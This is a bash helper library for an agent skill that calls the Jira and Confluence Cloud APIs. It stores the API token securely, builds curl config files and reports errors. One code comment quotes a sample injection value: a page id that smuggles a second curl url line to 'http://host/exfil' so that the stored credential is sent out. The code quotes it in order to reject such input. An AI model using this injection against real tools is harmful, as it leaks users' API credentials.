#!/bin/bash
# Shared configuration and request helpers for every script in this skill.
# Sourced by the other scripts; not run directly.
#
# The API token never reaches the command line. curl reads the URL, the
# credentials and the method from a 0600 config file, so the token is not
# visible in `ps`, in shell history, or in any process listing.

# Settings live under ~/.dbhq/<skill-family>/, which is the house rule for every
# DBHQ skill. This was ~/.jira until 17 Sep 2026, then ~/.dbhq/jira, and it is
# ~/.dbhq/atlassian from the point jira and confluence started sharing it - one
# Atlassian Cloud token authenticates both products on the same site.
#
# Both moves happen here, on first run, each guarded on the new directory not
# existing. An install that has never been upgraded moves twice, ~/.jira to
# ~/.dbhq/jira to ~/.dbhq/atlassian, and that is correct. The move also sets
# the house modes, in case a legacy install was looser: 700 on the directory,
# 600 on config.json.
CONFIG_DIR="$HOME/.dbhq/atlassian"
CONFIG_FILE="$CONFIG_DIR/config.json"

atlassian_migrate_legacy_config() {
    [ -d "$CONFIG_DIR" ] && return 0
    mkdir -p "$HOME/.dbhq"
    chmod 700 "$HOME/.dbhq" 2>/dev/null || true
    local from=""
    if [ -d "$HOME/.dbhq/jira" ]; then
        from="$HOME/.dbhq/jira"
    elif [ -d "$HOME/.jira" ]; then
        from="$HOME/.jira"
    else
        return 0
    fi
    mv "$from" "$CONFIG_DIR"
    chmod 700 "$CONFIG_DIR" 2>/dev/null || true
    if [ -f "$CONFIG_FILE" ]; then
        chmod 600 "$CONFIG_FILE" 2>/dev/null || true
    fi
    echo "Moved Atlassian credentials from $from to $CONFIG_DIR." >&2
}

atlassian_migrate_legacy_config

# setup_hint - how to run setup, with the full path. Setup asks for the token
# with the input hidden, so it needs a person at a terminal: an agent hands
# this line to the user rather than running it.
setup_path() {
    printf '%s/atlassian-setup.sh' "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
}

setup_hint() {
    echo "Fix: run this in your own terminal (it asks for the API token, so an agent cannot run it for you):" >&2
    echo "  $(setup_path)" >&2
}

require_config() {
    if [ ! -f "$CONFIG_FILE" ]; then
        echo "Error: no credentials. Cause: $CONFIG_FILE does not exist." >&2
        setup_hint
        exit 1
    fi
    SITE=$(jq -r '.site // empty' "$CONFIG_FILE")
    EMAIL=$(jq -r '.email // empty' "$CONFIG_FILE")
    TOKEN=$(jq -r '.token // empty' "$CONFIG_FILE")
    if [ -z "$SITE" ] || [ -z "$EMAIL" ] || [ -z "$TOKEN" ]; then
        echo "Error: $CONFIG_FILE is missing site, email or token." >&2
        setup_hint
        exit 1
    fi
    # Where requests go, one base per product. A classic API token calls the
    # site itself. A scoped token has to call Atlassian's gateway,
    # api.atlassian.com/ex/<product>/<cloud id>, because the site answers it
    # with 401. Setup works out which and records both bases. A credential
    # saved before scoped tokens were supported has neither, so it calls the
    # site, as it always did.
    JIRA_BASE=$(jq -r 'if (.jira_base // "") == "" then .site else .jira_base end' "$CONFIG_FILE")
    CONFLUENCE_BASE=$(jq -r 'if (.confluence_base // "") == "" then .site else .confluence_base end' "$CONFIG_FILE")
    local base
    for base in "$JIRA_BASE" "$CONFLUENCE_BASE"; do
        case "$base" in
            *'"'*|*$'\n'*|*' '*) ;;
            https://*) continue ;;
        esac
        echo "Error: $CONFIG_FILE holds a request base that is not a plain https URL: $base" >&2
        setup_hint
        exit 1
    done
}

# api_url <path> - the full URL for an API path such as /rest/api/3/myself or
# /wiki/api/v2/pages/123. A path under /wiki/ is Confluence; anything else is
# Jira. See require_config for the two bases.
api_url() {
    case "$1" in
        /wiki/*) printf '%s%s' "$CONFLUENCE_BASE" "$1" ;;
        *)       printf '%s%s' "$JIRA_BASE" "$1" ;;
    esac
}

# api <METHOD> <PATH> [JSON_BODY]
# PATH is appended to the product's base (see api_url), e.g. /rest/api/3/myself
# Sets API_BODY, API_STATUS and API_PATH. Prints nothing.
#
# Call it as a plain statement, never as $(api ...) - a command substitution
# runs in a subshell, so API_STATUS would never reach the caller.
api() {
    local method="$1" path="$2" body="${3:-}"
    local cfg out curl_status
    # Which API the call went to, so api_fail can word its advice for Jira
    # or for Confluence.
    # shellcheck disable=SC2034
    API_PATH="$path"

    # PATH is built from caller-supplied values (an issue key, a page id, a
    # CQL query) and lands verbatim inside a curl -K config file as
    # `url = "SITE+PATH"`. A double quote or a newline in it breaks out of
    # that quoted value and starts a new curl directive on the next line -
    # e.g. a following `url = "..."` line for a second, attacker-chosen
    # request, which still inherits the `user = "email:token"` line already
    # in the same file. Proven live with strace: a page id of
    # $'123"\nurl = "http://host/exfil' produced two transfers from one
    # call, the second carrying the credential to the attacker's host.
    # Rejecting both characters here protects every caller of api() - not
    # just confluence-pages.sh, but jira-meta.sh and jira-issues.sh too,
    # which also splice user-supplied values (issue keys, project keys)
    # into PATH.
    case "$path" in
        *'"'*|*$'\n'*)
            echo "Error: refusing to build a request for this path." >&2
            echo "Cause: it contains a double quote or a newline, which can break out of the curl config file and inject a second, attacker-chosen request." >&2
            echo "Fix: check the id or query value passed in - it should not contain those characters." >&2
            exit 1
            ;;
    esac

    cfg=$(mktemp) || { echo "Error: cannot create a temp file for the curl config." >&2; exit 1; }
    chmod 600 "$cfg"
    # Response headers hold no credential (the token goes out, never comes
    # back), but they are the only place a 429's Retry-After lives, so it is
    # dumped to its own temp file and read below.
    hdrs=$(mktemp) || { echo "Error: cannot create a temp file for the response headers." >&2; exit 1; }
    # The `rm -f "$cfg" "$hdrs"` below only runs on a normal return from this
    # function. A signal - Ctrl-C while curl is mid-request, a killed parent
    # - skips straight past it and leaves a file naming the token in plain
    # text (`user = "email:TOKEN"`) sitting in /tmp. The trap is the same
    # cleanup on every exit path, not just the one this function's own
    # control flow happens to reach.
    trap 'rm -f "$cfg" "$hdrs"' EXIT INT TERM HUP
    {
        printf 'url = "%s"\n' "$(api_url "$path")"
        printf 'user = "%s:%s"\n' "$EMAIL" "$TOKEN"
        printf 'request = "%s"\n' "$method"
        printf 'header = "Accept: application/json"\n'
        printf 'dump-header = "%s"\n' "$hdrs"
        printf 'silent\n'
        printf 'show-error\n'
        printf 'write-out = "\\n%%{http_code}"\n'
        if [ -n "$body" ]; then
            printf 'header = "Content-Type: application/json"\n'
            printf 'data-binary = "@-"\n'
        fi
    } > "$cfg"

    # errexit is turned off around the curl call itself so a connection, DNS,
    # TLS or proxy failure does not abort the function before the temp file
    # below is removed. A config file naming the token in plain text (as
    # `user = "email:TOKEN"`) surviving in /tmp after any such failure is
    # itself a credential leak - proven live by reproducing one and reading
    # it back. A signal (Ctrl-C, a killed parent) needs the same care and is
    # what the trap just above is for.
    set +e
    if [ -n "$body" ]; then
        out=$(printf '%s' "$body" | curl -K "$cfg")
    else
        out=$(curl -K "$cfg" < /dev/null)
    fi
    curl_status=$?
    set -e

    if [ "$curl_status" -ne 0 ]; then
        rm -f "$cfg" "$hdrs"
        echo "Error: the request to the Atlassian API failed (curl exit $curl_status)." >&2
        echo "Cause: a network, DNS, TLS or proxy failure - see curl's own message above, if any." >&2
        echo "Fix: check connectivity and try again." >&2
        exit 1
    fi

    # write-out appended "\n<status>". $'\n' is literal inside a quoted
    # expansion, so the newline goes through a variable.
    local nl=$'\n'
    API_STATUS="${out##*"$nl"}"
    # These two are how api() returns. jira-meta.sh and jira-issues.sh source
    # this file and read them; shellcheck sees only this file, so it cannot.
    # shellcheck disable=SC2034
    API_BODY="${out%"$nl"*}"
    # A 429's Retry-After, when the API sent one - read before the header
    # file is removed. Header names are case-insensitive and curl lower-
    # cases nothing, so match either case; strip the trailing \r a dumped
    # HTTP header carries.
    # shellcheck disable=SC2034
    API_RETRY_AFTER=""
    if [ "$API_STATUS" = "429" ]; then
        API_RETRY_AFTER=$(grep -i '^retry-after:' "$hdrs" 2>/dev/null | tail -1 | cut -d: -f2- | tr -d '\r' | sed 's/^ *//')
    fi
    rm -f "$cfg" "$hdrs"
}

# api_ok - true when the last api call returned a 2xx status.
api_ok() {
    case "$API_STATUS" in
        2*) return 0 ;;
        *)  return 1 ;;
    esac
}

# api_fail <response> <context> - report a Jira or Confluence error as cause +
# fix, then exit 1. The product is read from API_PATH, the last call's path.
#
# The error shapes differ. Jira sends errorMessages (a list) and errors (an
# object of field: message). Confluence v2 sends errors as a list of objects
# with a title and a detail. Confluence v1 sends a message.
api_fail() {
    local response="$1" context="$2" msg product="Jira"
    local limits="https://developer.atlassian.com/cloud/jira/platform/rate-limiting/"
    case "${API_PATH:-}" in
        /wiki/*)
            product="Confluence"
            limits="https://developer.atlassian.com/cloud/confluence/rate-limiting/"
            ;;
    esac
    echo "Error: $context failed (HTTP $API_STATUS)." >&2
    msg=$(printf '%s' "$response" | jq -r '
        def text: if type == "string" then . else tojson end;
        ((.errorMessages // [])
         + (if (.errors | type) == "array"
            then [.errors[] | if type == "object"
                              then ([.title, .detail, .message] | map(select(. != null and . != "")) | map(text) | join(": "))
                              else text end]
            elif (.errors | type) == "object"
            then (.errors | to_entries | map("\(.key): \(.value | text)"))
            else [] end)
         + (if (.message | type) == "string" and .message != "" then [.message] else [] end))
        | map(select(. != ""))
        | if length > 0 then join("; ") else empty end' 2>/dev/null)
    if [ -n "$msg" ]; then
        echo "Cause: $msg" >&2
    else
        echo "Cause: $(printf '%s' "$response" | head -c 300)" >&2
    fi
    case "$API_STATUS" in
        401) echo "Fix: the token was refused. It may have expired (an API token lasts at most one year), been revoked, or not belong to this email. A scoped token is also refused for a scope it was not given. Create a new token, then run setup again in your own terminal:" >&2
             echo "  $(setup_path)" >&2 ;;
        403)
            if [ "$product" = "Confluence" ]; then
                echo "Fix: your account lacks permission for this space or page." >&2
            else
                echo "Fix: your account lacks permission for this project." >&2
            fi
            ;;
        404)
            if [ "$product" = "Confluence" ]; then
                echo "Fix: check the page id or space id exists and is visible to you." >&2
            else
                echo "Fix: check the project key or issue key exists and is visible to you." >&2
            fi
            ;;
        429)
            if [ -n "${API_RETRY_AFTER:-}" ]; then
                echo "Fix: rate limited. The API says wait ${API_RETRY_AFTER}s, then retry. See $limits" >&2
            else
                echo "Fix: rate limited. Wait a few seconds, doubling the wait each time, then retry. See $limits" >&2
            fi
            ;;
    esac
    exit 1
}

# text_to_adf <text> - convert plain text to an Atlassian Document Format doc.
# Blank lines separate paragraphs. Jira Cloud REST v3 requires ADF, not a string.
text_to_adf() {
    jq -n --arg t "$1" '
        [$t | rtrimstr("\n") | split("\n\n")[] | select(length > 0)] as $paras
        | {type: "doc", version: 1,
           content: [$paras[] | {type: "paragraph",
                                 content: [{type: "text", text: .}]}]}'
}

# htmlplus_markdown - read an ADF document on stdin and print it as markdown,
# for reading only. Tables, nested lists and mentions survive; see
# htmlplus.py's adf_to_markdown. Exits 1 with the converter's message on
# stderr if the document cannot be read.
htmlplus_markdown() {
    local script
    script="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/htmlplus.py"
    python3 "$script" to-markdown
}

# htmlplus_jira <html-file> - convert an HTML+ fragment to ADF for a Jira field.
# Refuses any node or mark not on Atlassian's Jira list. Emits the ADF
# document as JSON on stdout; exits 1 with the converter's message on stderr.
#
# Named for the script rather than the operation so it cannot be confused with
# the Python html_to_adf(), which is a different function with a wider profile.
htmlplus_jira() {
    local script
    script="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/htmlplus.py"
    python3 "$script" to-adf-jira < "$1"
}
